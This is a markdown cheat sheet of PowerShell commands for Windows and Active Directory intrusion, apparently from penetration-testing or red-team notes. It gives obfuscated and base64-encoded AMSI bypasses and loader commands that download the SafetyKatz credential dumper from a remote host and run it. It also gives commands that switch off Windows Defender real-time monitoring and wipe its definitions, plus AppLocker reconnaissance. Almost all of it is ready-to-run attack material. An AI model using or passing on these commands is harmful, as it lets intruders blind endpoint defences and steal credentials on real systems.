## Tools
https://github.com/Raptoratack/ADTools

---
## Bypass AMSI and ETW
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

#Base64
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

#On PowerShell 6
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Bypass AMSI and ETW based detection by loading the binary using loader utility
C:\Users\Public\Loader.exe -path http://10.10.10.10/SafetyKatz.exe
C:\Users\Public\AssemblyLoad.exe http://10.10.10.10/Loader.exe -path http://10.10.10.10/SafetyKatz.exe
```
---
## Bypass Real-Time-monitoring
```powershell
Powershell Set-MpPreference -DisableRealtimeMonitoring $true
Powershell Set-MpPreference -DisableIOAVProtection $true
powershell set-MpPreference -DisableAutoExclusions $true
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
---
## Bypassing Applocker & WDAC Bypas
```powershell
# Check if Powershell is running in Constrained Language Mode (It may be because of Applocker or WDAC)
$ExecutionContext.SessionState.LanguageMode

# Check applocker policy for Application Whitelisting via Powerview and Registry (reg.exe)
Get-AppLockerPolicy –Effective
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2